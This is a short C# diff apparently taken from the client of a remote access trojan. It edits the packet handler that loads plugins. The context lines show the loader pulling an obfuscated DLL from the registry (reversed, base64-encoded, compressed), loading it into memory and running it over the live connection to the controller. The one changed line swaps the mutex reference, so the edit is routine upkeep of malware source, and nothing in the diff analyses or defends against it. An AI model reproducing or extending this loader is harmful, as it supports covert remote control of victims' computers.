@@ -37,7 +37,7 @@ namespace Client.Handle_Packet
                             Assembly assembly = AppDomain.CurrentDomain.Load(Zip.Decompress(Convert.FromBase64String(Strings.StrReverse(SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString)))));
                             Type type = assembly.GetType("Plugin.Plugin");
                             dynamic instance = Activator.CreateInstance(type);
-                            instance.Run(ClientSocket.TcpClient, Settings.ServerCertificate, Settings.Hwid, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), Methods._appMutex, Settings.MTX, Settings.BDOS, Settings.Install);
+                            instance.Run(ClientSocket.TcpClient, Settings.ServerCertificate, Settings.Hwid, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), MutexControl.currentApp, Settings.MTX, Settings.BDOS, Settings.Install);
                             break;
                         }
 
